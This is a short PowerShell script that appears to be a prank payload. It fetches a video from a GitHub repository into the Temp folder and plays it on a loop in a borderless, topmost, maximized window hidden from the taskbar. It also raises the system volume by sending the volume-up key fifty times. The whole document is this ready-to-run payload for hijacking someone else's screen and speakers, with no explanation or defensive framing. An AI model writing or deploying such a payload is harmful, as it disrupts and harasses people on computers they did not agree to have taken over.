invoke-webrequest -UseBasicParsing https://github.com/piratevision/dolphin-gang/blob/main/flairhorn.mp4?raw=true -outfile $ENV:Temp\flairhorn.mp4

Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.ComponentModel

[xml]$XAML = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="📣📣📣📣📣📣📣📣📣📣📣📣📣" ResizeMode="NoResize" WindowStyle="None" Topmost="True" WindowState="Maximized" ShowInTaskbar="False" >
    <Grid>
        <MediaElement Name="VideoPlayer" Source="$($ENV:Temp)\flairhorn.mp4" Volume="100" Stretch="Uniform"/>
    </Grid>
</Window>
"@
$XAMLReader=(New-Object System.Xml.XmlNodeReader $XAML)
$Window=[Windows.Markup.XamlReader]::Load( $XAMLReader )
$VideoPlayer = $Window.FindName('VideoPlayer')
$VideoPlayer.add_MediaEnded({
    param($sender, $args)
    $sender.Position = [TimeSpan]::Zero
})
$obj=New-Object -ComObject WScript.Shell;for($i=0;$i -lt 50;$i++){$obj.SendKeys([char] 175)}
$Window.ShowDialog() | out-null
